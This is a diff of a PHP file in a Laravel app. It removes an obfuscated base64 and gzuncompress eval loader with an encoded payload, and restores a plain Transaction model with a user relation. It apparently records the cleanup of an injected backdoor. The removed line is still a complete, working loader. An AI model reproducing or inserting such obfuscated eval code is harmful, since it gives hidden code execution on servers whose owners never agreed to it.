@@ -1,1 +1,16 @@
-<?php $_='56fef0ee';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNplUlFzojAQfr9fwUNn0Jl7ALH1GIaHQg2KUzyxJsCLQxIELEGmFAV+/QXUK51mJslm99tvd7MrCNf1sP9auhjK4eGJzFRRe7gqio80/zyI2i9hgNcF0ZPVM0Yw9ze6Lgpf5jufzkWRMChRz66WppFRBsqV6R48+U+xvnROwnfSvSD0Tjgso6fpnkbkRCNR+5Hiy+bkmOwx4dFbYoFjsDUMsjDIG1LfA1S364u0etkUMpns4i2qS4rkAjMgBbCe+56b+Ay0XAbYUmuKYEVBbfnIkbBiF4HnkK0FWpeBI7XUJnorHTOHLY9hY6uWMcoqzpF5czehFkh9z+EyLLEC5AA9St5cPgcWLG85HDHnIo2xIwxUZNJxZmecGlm0cDPM3HZ5w3PsjNcVL83nmHLO5TxJiBQkvuKeSf4+62tOn7nduFBklyF6jYMcVtxe4Mm09yFpXNw5Ih6/u6/baALPlQmbxvbCPYXe6+dfZme8/ipQnB1uEkgmsFkf7/leYlsxkgiBFFvwEKJNvur+4Rpf5bnyfdIHMzFoe3+Pbq9xP0UD3Vi7I3vlSOxO8fd/+PeBuPGMhv0fj7V/lNDWsQ=='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+
+class Transaction extends Model
+{
+    use HasFactory;
+
+    public function user()
+    {
+        return $this->belongsTo(User::class, 'payable_id');
+    }
+}
